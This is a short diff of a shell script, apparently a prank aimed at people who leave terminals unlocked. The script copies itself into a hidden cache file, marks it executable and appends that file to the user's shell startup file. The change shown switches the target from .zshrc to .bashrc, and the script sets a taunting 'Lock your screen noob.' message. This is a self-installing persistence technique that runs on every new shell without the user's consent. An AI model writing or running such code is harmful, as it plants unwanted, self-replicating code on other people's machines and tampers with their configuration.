@@ -1,6 +1,6 @@
 echo "$(cat $0)" > ~/.cache/coucou.sh
 chmod a+rx ~/.cache/coucou.sh
-echo "~/.cache/coucou.sh" >> ~/.zshrc
+echo "~/.cache/coucou.sh" >> ~/.bashrc
 
 coucou="Lock your screen noob.";
 
